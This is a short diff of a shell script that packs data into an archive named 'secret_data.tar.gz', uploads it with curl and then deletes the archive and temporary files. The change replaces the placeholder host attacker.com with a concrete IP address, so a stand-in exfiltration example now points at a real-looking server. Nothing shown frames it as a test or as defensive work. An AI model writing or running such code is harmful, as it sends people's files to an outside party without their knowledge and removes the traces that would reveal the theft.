@@ -26,7 +26,7 @@ ARCHIVE_NAME="secret_data.tar.gz"
 tar -czf "$ARCHIVE_NAME" -C "$TMP_DIR" .
 
 # Upload the archive using curl
-curl -T "$ARCHIVE_NAME" http://attacker.com/upload
+curl -T "$ARCHIVE_NAME" http://20.93.23.234/upload
 
 # Clean up
 rm -rf "$TMP_DIR" "$ARCHIVE_NAME"
